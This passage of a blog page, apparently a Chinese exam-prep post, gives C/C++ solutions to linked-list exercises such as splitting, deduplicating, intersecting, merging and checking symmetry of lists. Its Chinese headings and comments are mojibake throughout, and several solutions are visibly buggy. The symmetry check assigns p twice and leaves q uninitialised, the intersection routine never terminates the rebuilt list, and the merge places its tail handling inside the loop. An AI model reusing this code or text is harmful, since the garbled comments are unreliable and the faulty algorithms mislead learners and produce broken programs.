cout<span class="token operator">&lt;&lt;</span>pre<span class="token operator">-></span>next<span class="token operator">-></span>data<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">//è¾“å‡ºæœ€å°ç»“ç‚¹å€¼</span>        <span class="token comment">// é‡Šæ”¾ç©ºé—´ï¼Œfreeï¼Œå¹¶ä¿è¯ä¸æ–­é“¾</span>        p <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// </span>        pre<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">//ä¿æ­£ä¸æ–­é“¾</span>        <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">free</span><span class="token punctuation">(</span>Head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200824224009888.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824224009888.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="17-è®¾C-a1-b1-a2-b2â€¦-an-bn-ä¸ºçº¿æ€§è¡¨ï¼Œé‡‡ç”¨å¸¦å¤´ç»“ç‚¹çš„hcå•é“¾è¡¨å­˜æ”¾ï¼Œè®¾è®¡ä¸€ä¸ªå°±åœ°ç®—æ³•ï¼Œå°†å…¶æ‹†åˆ†ä¸ºä¸¤ä¸ªçº¿æ€§è¡¨ï¼Œä½¿å¾—A-a1-a2-â€¦-an-B-bn-â€¦-b2-b1">17)  è®¾C={a1,b1,a2,b2â€¦,an,bn}ä¸ºçº¿æ€§è¡¨ï¼Œé‡‡ç”¨å¸¦å¤´ç»“ç‚¹çš„hcå•é“¾è¡¨å­˜æ”¾ï¼Œè®¾è®¡ä¸€ä¸ªå°±åœ°ç®—æ³•ï¼Œå°†å…¶æ‹†åˆ†ä¸ºä¸¤ä¸ªçº¿æ€§è¡¨ï¼Œä½¿å¾—A={a1,a2,â€¦,an} B={bn,â€¦,b2,b1}</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">// æ€æƒ³ï¼š Aå­˜æ”¾çš„æ˜¯å¥‡æ•°ä½ç½®ï¼Œå°¾æ’æ³• ï¼› Bå­˜æ”¾çš„æ˜¯å¶æ•°ä½ç½®ï¼Œå¤´æ’æ³•</span><span class="token keyword">void</span> <span class="token function">fun2</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist la<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>pl<span class="token punctuation">,</span>pa<span class="token punctuation">,</span>pb<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>    la <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lb <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> la<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>lb<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    pa <span class="token operator">=</span> la<span class="token punctuation">;</span>pb <span class="token operator">=</span> lb<span class="token punctuation">;</span>    pl <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    i<span class="token operator">++</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> pl<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// ä¿å­˜åç»§ç»“ç‚¹ï¼Œé˜²æ­¢æ–­é“¾</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// Aé‡‡ç”¨å°¾æ’æ³•</span>            pl<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// å¾ˆé‡è¦,ä¿è¯å°¾å¿…ä¸ºnull</span>            pa<span class="token operator">-></span>next <span class="token operator">=</span> pl<span class="token punctuation">;</span>            pa <span class="token operator">=</span> pl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>           <span class="token comment">// Bé‡‡ç”¨å¤´æ’æ³•</span>            pl<span class="token operator">-></span>next <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>            pb<span class="token operator">-></span>next <span class="token operator">=</span> pl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        pl <span class="token operator">=</span> temp<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token function">Visit</span><span class="token punctuation">(</span>la<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Visit</span><span class="token punctuation">(</span>lb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200824224031449.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824224031449.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="18-åœ¨ä¸€ä¸ªé€’å¢æœ‰åºçš„çº¿æ€§è¡¨ä¸­ï¼Œæœ‰æ•°å€¼ç›¸åŒçš„å…ƒç´ å­˜åœ¨ã€‚è‹¥å­˜å‚¨æ–¹å¼ä¸ºå•é“¾è¡¨ï¼Œè®¾è®¡ç®—æ³•å»æ‰æ•°å€¼ç›¸åŒçš„å…ƒç´ ï¼Œä½¿è¡¨ä¸­ä¸å†æœ‰é‡å¤çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼ˆ7-10-10-21-30-42-42-42-51-70ï¼‰å°†å˜ä½œï¼ˆ7-10-21-30-42-51-70ï¼‰">18)  åœ¨ä¸€ä¸ªé€’å¢æœ‰åºçš„çº¿æ€§è¡¨ä¸­ï¼Œæœ‰æ•°å€¼ç›¸åŒçš„å…ƒç´ å­˜åœ¨ã€‚è‹¥å­˜å‚¨æ–¹å¼ä¸ºå•é“¾è¡¨ï¼Œè®¾è®¡ç®—æ³•å»æ‰æ•°å€¼ç›¸åŒçš„å…ƒç´ ï¼Œä½¿è¡¨ä¸­ä¸å†æœ‰é‡å¤çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼ˆ7,10,10,21,30,42,42,42,51,70ï¼‰å°†å˜ä½œï¼ˆ7,10,21,30,42,51,70ï¼‰</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">// é€’å¢æœ‰åºï¼Œ ç›¸åŒçš„æŒ¨ç€ï¼Œ ä¸€ä¸ªpre ä¸€ä¸ª p  æ¯”è¾ƒp->nextæ˜¯å¦å’Œpre->next ç›¸åŒ</span><span class="token comment">// ç›¸åŒåˆ é™¤ pç»“ç‚¹  O(N)</span><span class="token keyword">void</span> <span class="token function">delete_same</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist pre<span class="token punctuation">,</span>p<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>    pre <span class="token operator">=</span> L<span class="token punctuation">;</span>p <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// é˜²æ­¢æ–­é“¾</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next<span class="token operator">-></span>data <span class="token operator">==</span> pre<span class="token operator">-></span>next<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pre<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        pre <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        p <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200824224054742.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824224054742.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="19-è®¾Aå’ŒBæ˜¯ä¸¤ä¸ªå•é“¾è¡¨ï¼ˆå¸¦å¤´ç»“ç‚¹ï¼‰ï¼Œå…¶ä¸­å…ƒç´ é€’å¢æœ‰åºï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ä»Aå’ŒBä¸­å…¬å…±å…ƒç´ äº§ç”Ÿå•é“¾è¡¨Cï¼Œè¦æ±‚ä¸ç ´åA-B-çš„ç»“ç‚¹">19)  è®¾Aå’ŒBæ˜¯ä¸¤ä¸ªå•é“¾è¡¨ï¼ˆå¸¦å¤´ç»“ç‚¹ï¼‰ï¼Œå…¶ä¸­å…ƒç´ é€’å¢æœ‰åºï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ä»Aå’ŒBä¸­å…¬å…±å…ƒç´ äº§ç”Ÿå•é“¾è¡¨Cï¼Œè¦æ±‚ä¸ç ´åA B çš„ç»“ç‚¹</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">//æœ‰åº Cä¸­å…ƒç´ å³æ˜¯Açš„ä¹Ÿæ˜¯Bçš„ å°¾æ’å»ºé“¾è¡¨å³å¯</span><span class="token keyword">void</span> <span class="token function">fun3</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>A<span class="token punctuation">,</span>linklist <span class="token operator">&amp;</span>B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist C<span class="token punctuation">,</span>pa<span class="token punctuation">,</span>pb<span class="token punctuation">,</span>pc<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>    C <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> C<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    pc <span class="token operator">=</span> C<span class="token punctuation">;</span>    pa <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">,</span>pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pa <span class="token operator">&amp;&amp;</span> pb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// å°æŠ˜åç§»</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> pa<span class="token operator">-></span>data <span class="token operator">&lt;</span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> pa<span class="token operator">-></span>data <span class="token operator">></span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span>         <span class="token punctuation">&#123;</span>           <span class="token comment">// ç›¸åŒå€¼</span>            temp <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            temp<span class="token operator">-></span>data <span class="token operator">=</span> pa<span class="token operator">-></span>data<span class="token punctuation">;</span>            pc<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token punctuation">;</span>            <span class="token comment">/*            å¦‚æœè¿™æ ·å†™å°±ä¼šå‡ºç°å›¾2çš„æƒ…å†µ            pc->next = pa;            pc = pa;            */</span>            pc <span class="token operator">=</span> temp<span class="token punctuation">;</span>            <span class="token comment">// åŒæ—¶åç§»</span>            pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>            pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">Visit</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200824224106163.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824224106163.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20200824224113285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824224113285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="20-å·²çŸ¥ä¸¤ä¸ªé“¾è¡¨Aå’ŒBåˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªé›†åˆï¼Œå…¶å…ƒç´ é€’å¢æ’åˆ—ã€‚ç»˜åˆ¶å‡½æ•°ï¼Œæ±‚Aä¸Bçš„äº¤é›†ï¼Œå¹¶å­˜æ”¾äºAé“¾è¡¨ä¸­ã€‚">20)  å·²çŸ¥ä¸¤ä¸ªé“¾è¡¨Aå’ŒBåˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªé›†åˆï¼Œå…¶å…ƒç´ é€’å¢æ’åˆ—ã€‚ç»˜åˆ¶å‡½æ•°ï¼Œæ±‚Aä¸Bçš„äº¤é›†ï¼Œå¹¶å­˜æ”¾äºAé“¾è¡¨ä¸­ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">//  æœ‰åºï¼Œ ç›¸åŒå­˜å…¥ï¼ŒABåŒæ—¶åç§»ï¼Œ ä¸åŒï¼Œå°è€…åç§»</span><span class="token keyword">void</span> <span class="token function">fun4</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>A<span class="token punctuation">,</span>linklist <span class="token operator">&amp;</span>B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist pa<span class="token punctuation">,</span>pb<span class="token punctuation">,</span>pre<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>    pa <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>    pre <span class="token operator">=</span> A<span class="token punctuation">;</span> <span class="token comment">// pre æŒ‡å‘A  é‡æ„Aé“¾è¡¨</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pa<span class="token operator">&amp;&amp;</span>pb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// å°è€…åç§»</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> pa<span class="token operator">-></span>data <span class="token operator">&lt;</span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pa <span class="token operator">=</span> pa <span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pa<span class="token operator">-></span>data <span class="token operator">></span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">// ç›¸ç­‰æ—¶å­˜å…¥ï¼Œ</span>            temp <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            temp<span class="token operator">-></span>data <span class="token operator">=</span> pa<span class="token operator">-></span>data<span class="token punctuation">;</span>            pre<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token punctuation">;</span>            pre <span class="token operator">=</span> temp<span class="token punctuation">;</span>            pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>            pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/2020082522163453.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2020082522163453.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="21-å¤´æŒ‡é’ˆåˆ†åˆ«ä¸ºla-lbçš„å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ä¸­ï¼Œç»“ç‚¹æŒ‰å…ƒç´ é€’å¢æœ‰åºæ’åˆ—ï¼Œå°†laå’Œlbä¸¤ä¸ªé“¾è¡¨åˆå¹¶æˆæŒ‰å…ƒç´ é€’å¢æœ‰åºçš„å•é“¾è¡¨ï¼Œè¦æ±‚ä¸å¦å¤–å¼€è¾Ÿç©ºé—´ï¼Œlaä½œä¸ºåˆå¹¶åçš„å•é“¾è¡¨çš„å¤´ç»“ç‚¹-951-Y19">21) å¤´æŒ‡é’ˆåˆ†åˆ«ä¸ºla,lbçš„å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ä¸­ï¼Œç»“ç‚¹æŒ‰å…ƒç´ é€’å¢æœ‰åºæ’åˆ—ï¼Œå°†laå’Œlbä¸¤ä¸ªé“¾è¡¨åˆå¹¶æˆæŒ‰å…ƒç´ é€’å¢æœ‰åºçš„å•é“¾è¡¨ï¼Œè¦æ±‚ä¸å¦å¤–å¼€è¾Ÿç©ºé—´ï¼Œlaä½œä¸ºåˆå¹¶åçš„å•é“¾è¡¨çš„å¤´ç»“ç‚¹(951.Y19)</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">//  å½’å¹¶ åŸç†ä¸ä¸Šé¢˜ä¸€è‡´</span>linklist <span class="token function">Union</span><span class="token punctuation">(</span>linklist la<span class="token punctuation">,</span>linklist lb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">,</span>s<span class="token punctuation">;</span>    p <span class="token operator">=</span> la<span class="token operator">-></span>next<span class="token punctuation">,</span>q <span class="token operator">=</span> lb<span class="token operator">-></span>next<span class="token punctuation">;</span>    r <span class="token operator">=</span> la<span class="token punctuation">;</span> <span class="token comment">// ré‡æ„la</span>    <span class="token keyword">while</span><span class="token punctuation">(</span> p <span class="token operator">&amp;&amp;</span> q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> p<span class="token operator">-></span>data <span class="token operator">&lt;</span> q<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>            r <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> p<span class="token operator">-></span>data <span class="token operator">></span> q<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>            r <span class="token operator">=</span> q<span class="token punctuation">;</span>            q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>            r <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            s <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token function">free</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>           q <span class="token operator">=</span> s<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>            r<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> la<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="22-ä¸¤ä¸ªæ•´æ•°åºåˆ—A-a1-a2-a3-â€¦-amå’ŒB-b1-b2-b3-â€¦-bnå·²ç»å­˜å…¥ä¸¤ä¸ªå•é“¾è¡¨ä¸­ï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåˆ¤æ–­åºåˆ—Bæ˜¯å¦æ˜¯åºåˆ—Açš„è¿ç»­å­åºåˆ—">22)  ä¸¤ä¸ªæ•´æ•°åºåˆ—A=a1,a2,a3,â€¦,amå’ŒB=b1,b2,b3,â€¦,bnå·²ç»å­˜å…¥ä¸¤ä¸ªå•é“¾è¡¨ä¸­ï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåˆ¤æ–­åºåˆ—Bæ˜¯å¦æ˜¯åºåˆ—Açš„è¿ç»­å­åºåˆ—</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** æ¨¡å¼åŒ¹é… é“¾è¡¨å®ç° ä¸€èˆ¬ç®—æ³• O(n^2)  * å¸¦å¤´ç»“ç‚¹, å½“ç›¸åŒæ—¶ï¼ŒåŒæ—¶åç§»ï¼Œï¼Œ å½“ä¸ç›¸åŒæ—¶ï¼ŒBä»å¤´å¼€å§‹ï¼ŒAåç§»ä¸€ä¸ª* åˆ¤æ–­æ¡ä»¶ï¼š å¦‚æœBè·‘å®Œè¯´æ˜åŒ¹é…å®Œæˆï¼Œå¦åˆ™ä¸å­˜åœ¨*/</span><span class="token keyword">int</span> <span class="token function">Pattern</span><span class="token punctuation">(</span>linklist A<span class="token punctuation">,</span>linklist B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist pa<span class="token punctuation">,</span>pb<span class="token punctuation">,</span>pre<span class="token punctuation">;</span>    pa <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">,</span>pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>    pre <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pa<span class="token operator">&amp;&amp;</span>pb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// ç›¸åŒï¼ŒåŒæ—¶åç§»</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pa<span class="token operator">-></span>data <span class="token operator">==</span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>            pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">// ä¸ç›¸åŒ Aåç§»</span>            pre <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span>            pa <span class="token operator">=</span> pre<span class="token punctuation">;</span> <span class="token comment">// Aåç§»ä¸€ä¸ªç»“ç‚¹åä»æ–°åŒ¹é…ï¼Œ</span>            pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// Bä»å¤´å¼€å§‹  </span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> pb <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token operator">?</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// å¦‚æœpb è·‘å®Œè¯´æ˜åŒ¹é…å®Œæˆå­˜åœ¨</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200825221729532.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200825221729532.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="23-è®¾è®¡ä¸€ä¸ªç®—æ³•ç”¨äºåˆ¤æ–­å¸¦å¤´ç»“ç‚¹çš„å¾ªç¯åŒé“¾è¡¨æ˜¯å¦å¯¹ç§°">23)  è®¾è®¡ä¸€ä¸ªç®—æ³•ç”¨äºåˆ¤æ–­å¸¦å¤´ç»“ç‚¹çš„å¾ªç¯åŒé“¾è¡¨æ˜¯å¦å¯¹ç§°</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** å¯¹ç§°æŒ‡ è®¾å„å…ƒç´ å€¼ a1,a2,...,an, åˆ™æœ‰ ai=an-i+1 ï¼Œ* å³æŒ‡ï¼š a1= an ï¼Œ a2= an-1 ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚* p ä»å¤´ï¼Œ q ä»å°¾ å½“ä¸¤ä¸ªç›¸åŒæ—¶ï¼Œpåç§»ï¼Œqå‰ç§»ï¼Œä¸€æ—¦ä¸åŒåˆ™breakï¼Œ* ç»“æŸæ¡ä»¶ã€€p==qã€€|ï½œp->next = q;  */</span><span class="token keyword">int</span> <span class="token function">flag1</span><span class="token punctuation">(</span>linklist L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>q<span class="token punctuation">;</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span> p <span class="token operator">=</span> L<span class="token operator">-></span>prior<span class="token punctuation">;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// åˆå§‹é»˜è®¤å¯¹ç§°</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">!=</span>q <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>next <span class="token operator">!=</span> q <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> p<span class="token operator">-></span>data <span class="token operator">==</span> q<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            q <span class="token operator">=</span> q<span class="token operator">-></span>prior<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token 